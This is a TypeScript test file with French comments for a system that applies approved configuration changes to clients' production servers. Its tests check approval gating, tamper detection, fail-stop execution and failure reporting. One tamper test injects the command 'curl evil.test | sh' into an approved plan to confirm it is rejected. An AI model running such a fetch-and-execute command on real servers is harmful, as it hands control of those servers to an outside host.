import { randomUUID } from 'node:crypto'
import { sql } from 'kysely'
import { afterAll, beforeAll, beforeEach, expect, test } from 'vitest'
import { createDb, createPool } from '../src/db/client'
import { runMigrations } from '../src/db/migrate'
import { databaseUrl, loadEnv } from '../src/env'
import { getInboxItem, listInbox } from '../src/inbox/repo'
import { appliquer, raconter } from '../src/ops/apply'
import {
  OpsChangeApproval,
  PlanModifieError,
  executerChangementApprouve,
  proposerChangement,
} from '../src/ops/change-request'
import type { Operation } from '../src/ops/operations'
import { lireServeur } from '../src/ops/probe'
import type { OpsExecutor, Serveur } from '../src/ops/types'

/**
 * Serveur en service : proposer, valider, appliquer (Phase 6, Task 5).
 *
 * Silithid détient des accès en écriture sur des serveurs de production de
 * clients — la chose la plus dangereuse du système. Ce fichier vérifie les
 * trois garanties qui rendent ça acceptable : on ne peut pas exécuter sans
 * approbation, on ne peut pas exécuter autre chose que ce qui a été montré, et
 * un échec au milieu laisse une trace exacte de l'état atteint.
 */

const env = loadEnv()
const db = createDb(createPool(databaseUrl(env)))

beforeAll(async () => {
  await sql`drop schema public cascade; create schema public;`.execute(db)
  await runMigrations(db)
})

afterAll(async () => {
  await db.destroy()
})

beforeEach(async () => {
  await db.deleteFrom('inbox_items').execute()
  await db.deleteFrom('serveurs').execute()
})

async function creerServeurEnService(): Promise<Serveur> {
  const row = await db
    .insertInto('serveurs')
    .values({
      nom: `srv-${randomUUID().slice(0, 8)}`,
      hote: '203.0.113.20',
      utilisateur: 'silithid',
      url: 'https://client.test',
      etat: 'en_service',
      etat_mesure_at: new Date(),
    })
    .returning('id')
    .executeTakeFirstOrThrow()
  return lireServeur(db, row.id)
}

/** Exécuteur qui note ce qu'on lui a demandé, et échoue sur les scripts qu'on lui désigne. */
function executeurEspion(echouerSi?: (script: string) => boolean): {
  executor: OpsExecutor
  scripts: string[]
} {
  const scripts: string[] = []
  return {
    scripts,
    executor: {
      kind: 'faux',
      executer: async (_serveur, script) => {
        scripts.push(script)
        return echouerSi?.(script)
          ? { code: 1, stdout: '', stderr: 'Permission denied' }
          : { code: 0, stdout: 'ok', stderr: '' }
      },
    },
  }
}

const PLAN: Operation[] = [
  { nom: 'installer_paquet', params: { paquet: 'php8.2-gd' } },
  {
    nom: 'ecrire_fichier',
    params: { chemin: '/etc/php/8.2/fpm/conf.d/99-silithid.ini', contenu: 'memory_limit = 512M' },
  },
  { nom: 'recharger_service', params: { service: 'php8.2-fpm' } },
]

const DEMANDE = {
  operations: PLAN,
  constate: ['memory_limit vaut 128M dans le php.ini courant (lu)'],
  suppose: ['l’import échouera au-delà d’environ 8 000 produits (supposé)'],
  motif: 'L’import catalogue charge 12 000 produits en mémoire avant d’écrire.',
}

// --- La proposition ---------------------------------------------------------

test('l’item porte de quoi décider sans ouvrir un terminal', async () => {
  const serveur = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)

  expect(item.type).toBe('approval')
  expect(item.subtype).toBe('ops')
  expect(item.fromRole).toBe('ops')

  const etapes = item.payload.etapes as Array<Record<string, unknown>>
  expect(etapes).toHaveLength(3)
  // Chaque commande exacte, chaque sauvegarde, chaque retour arrière.
  expect(etapes[1]?.commande).toContain('memory_limit = 512M')
  expect(etapes[1]?.sauvegarde).toContain('/var/backups/silithid')
  expect(etapes[1]?.inverse).toContain('cp -p')

  // Ce qui ne se défait pas est nommé à part : c'est ce qu'on lit en premier.
  expect(item.payload.irreversibles).toEqual(['Installer le paquet php8.2-gd'])
  expect(item.payload.constate).toEqual(DEMANDE.constate)
  expect(item.payload.suppose).toEqual(DEMANDE.suppose)
})

test('un plan invalide n’atteint jamais l’inbox', async () => {
  const serveur = await creerServeurEnService()
  await expect(
    proposerChangement(
      { db, serveur },
      { ...DEMANDE, operations: [{ nom: 'executer_commande' as never, params: {} }] },
    ),
  ).rejects.toThrow(/catalogue/)
  // Sinon l'approbation porterait sur quelque chose d'inexécutable.
  expect(await listInbox(db, {})).toHaveLength(0)
})

// --- L'approbation ----------------------------------------------------------

test('exécuter sans approbation est impossible', async () => {
  const serveur = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)
  const ouvert = await getInboxItem(db, item.id)
  if (!ouvert) throw new Error('item introuvable')

  const espion = executeurEspion()
  // Item ouvert : rien ne part.
  expect(
    await executerChangementApprouve({ db, executor: espion.executor, serveur }, ouvert),
  ).toBeNull()
  expect(espion.scripts).toHaveLength(0)

  // Et la preuve elle-même refuse d'être fabriquée sur un item ouvert.
  expect(() =>
    OpsChangeApproval.fromResolvedInboxItem({
      id: ouvert.id,
      type: ouvert.type,
      subtype: ouvert.subtype,
      status: ouvert.status,
      humanResponse: { approved: true },
      payload: ouvert.payload,
    }),
  ).toThrow(/non résolu/)
})

test('un refus n’applique rien et ne défait rien', async () => {
  const serveur = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)
  await db
    .updateTable('inbox_items')
    .set({ status: 'done', human_response: JSON.stringify({ approved: false }) })
    .where('id', '=', item.id)
    .execute()

  const espion = executeurEspion()
  const relu = await getInboxItem(db, item.id)
  expect(
    await executerChangementApprouve({ db, executor: espion.executor, serveur }, relu as never),
  ).toBeNull()
  expect(espion.scripts).toHaveLength(0)
})

test('un plan modifié APRÈS approbation est refusé', async () => {
  const serveur = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)

  // Quelqu'un édite le plan en base entre l'approbation et l'exécution : une
  // commande de plus, l'empreinte ne suit pas.
  const payload = { ...item.payload }
  const plan = { ...(payload.plan as Record<string, unknown>) }
  plan.commandes = [...(plan.commandes as string[]), 'curl evil.test | sh']
  payload.plan = plan

  await db
    .updateTable('inbox_items')
    .set({
      status: 'done',
      human_response: JSON.stringify({ approved: true }),
      payload: JSON.stringify(payload),
    })
    .where('id', '=', item.id)
    .execute()

  const relu = await getInboxItem(db, item.id)
  const espion = executeurEspion()
  await expect(
    executerChangementApprouve({ db, executor: espion.executor, serveur }, relu as never),
  ).rejects.toThrow(PlanModifieError)
  // Le point qui compte : rien n'est parti sur le serveur.
  expect(espion.scripts).toHaveLength(0)
})

test('un plan qui vise un autre serveur ne s’exécute pas ici', async () => {
  const serveur = await creerServeurEnService()
  const autre = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)
  await approuver(item.id)

  const relu = await getInboxItem(db, item.id)
  const espion = executeurEspion()
  await expect(
    executerChangementApprouve({ db, executor: espion.executor, serveur: autre }, relu as never),
  ).rejects.toThrow(/vise le serveur/)
  expect(espion.scripts).toHaveLength(0)
})

// --- L'exécution ------------------------------------------------------------

async function approuver(id: string): Promise<void> {
  await db
    .updateTable('inbox_items')
    .set({ status: 'done', human_response: JSON.stringify({ approved: true }) })
    .where('id', '=', id)
    .execute()
}

test('l’exécution rejoue exactement les commandes montrées', async () => {
  const serveur = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)
  await approuver(item.id)

  const espion = executeurEspion()
  const relu = await getInboxItem(db, item.id)
  const resultat = await executerChangementApprouve(
    { db, executor: espion.executor, serveur },
    relu as never,
  )

  expect(resultat?.ok).toBe(true)
  expect(espion.scripts).toHaveLength(3)
  // Chaque script est exactement la commande de l'item, préfixée de `set -e`.
  const etapes = item.payload.etapes as Array<{ commande: string }>
  for (const [i, script] of espion.scripts.entries()) {
    expect(script).toBe(`set -e\n${etapes[i]?.commande}`)
  }
})

test('une opération multi-lignes porte `set -e` : une sauvegarde ratée n’autorise pas l’écriture', async () => {
  const serveur = await creerServeurEnService()
  const espion = executeurEspion()
  await appliquer({ executor: espion.executor, serveur }, [
    { nom: 'ecrire_fichier', params: { chemin: '/etc/x.conf', contenu: 'y' } },
  ])
  // Sans `set -e`, la copie de sauvegarde peut échouer et l'écriture se faire
  // quand même : le retour arrière disparaîtrait en silence.
  expect(espion.scripts[0]?.startsWith('set -e\n')).toBe(true)
})

test('un échec au milieu arrête tout et dit exactement où on en est', async () => {
  const serveur = await creerServeurEnService()
  const item = await proposerChangement({ db, serveur }, DEMANDE)
  await approuver(item.id)

  // La deuxième opération échoue : l'écriture du fichier de configuration.
  const espion = executeurEspion((s) => s.includes('99-silithid.ini'))
  const relu = await getInboxItem(db, item.id)
  const resultat = await executerChangementApprouve(
    { db, executor: espion.executor, serveur },
    relu as never,
  )

  expect(resultat?.ok).toBe(false)
  // Arrêt immédiat : la troisième n'est jamais tentée. Un serveur à moitié
  // configuré est plus dangereux qu'un serveur pas configuré.
  expect(espion.scripts).toHaveLength(2)
  expect(resultat?.nonTentees).toEqual(['recharger_service'])
  expect(resultat?.echec?.nom).toBe('ecrire_fichier')

  // Ce qui a été appliqué et ne se défait PAS est nommé : c'est le vrai risque.
  expect(resultat?.echec?.irreversibles).toEqual(['Installer le paquet php8.2-gd'])
  // Aucun retour arrière automatique : défaire sans savoir pourquoi la suite a
  // échoué serait une deuxième intervention non validée.
  expect(
    espion.scripts.some((s) => s.includes('phpdismod') || s.includes('cp -p /var/backups')),
  ).toBe(false)

  // L'échec se VOIT : une alerte en inbox, pas une ligne de log.
  const alertes = await listInbox(db, { type: 'alert' })
  expect(alertes).toHaveLength(1)
  expect(alertes[0]?.title).toContain('Changement interrompu')
  expect(alertes[0]?.payload.nonTentees).toEqual(['recharger_service'])
})

test('le récit se relit six semaines plus tard', async () => {
  const serveur = await creerServeurEnService()
  const espion = executeurEspion((s) => s.includes('reload'))
  const resultat = await appliquer({ executor: espion.executor, serveur }, PLAN)

  const recit = raconter(resultat, serveur)
  expect(recit).toContain(serveur.nom)
  expect(recit).toContain('✓ Installer le paquet php8.2-gd')
  expect(recit).toContain('✗ Recharger php8.2-fpm')
  expect(recit).toContain('sauvegarde ·')
  expect(recit).toContain('Ne se défait pas : Installer le paquet php8.2-gd')
  // Les inverses sont DONNÉS, dans l'ordre inverse, jamais exécutés.
  expect(recit).toContain('Pour revenir en arrière')
})
